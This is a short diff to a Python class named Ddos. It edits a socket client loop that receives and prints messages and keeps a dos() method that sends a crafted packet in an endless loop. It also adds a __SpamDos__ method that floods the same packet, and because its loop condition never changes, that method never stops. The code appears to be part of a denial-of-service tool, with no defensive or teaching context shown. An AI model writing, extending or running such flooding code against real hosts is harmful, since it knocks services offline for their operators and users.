@@ -37,15 +37,19 @@ class Ddos:
 
     def ClientMode(self, ip: str, port: int):
         self.sock.connect((ip, port))
-        buffer = b'1'
 
-        while buffer != b'':
+        while True:
             buffer = self.sock.recv(4096)
-
-            if buffer == b"bye":
+            if buffer == b'bye' or buffer == b'':
                 break
+            print(f"   {buffer.decode()}")
+
         self.sock.close()
 
 
     def dos(self):
         send(self.packet, loop=1, verbose=1)
+
+    def __SpamDos__(self, massge):
+        while massge != "end":
+            send(self.packet, verbose=False, loop=False)
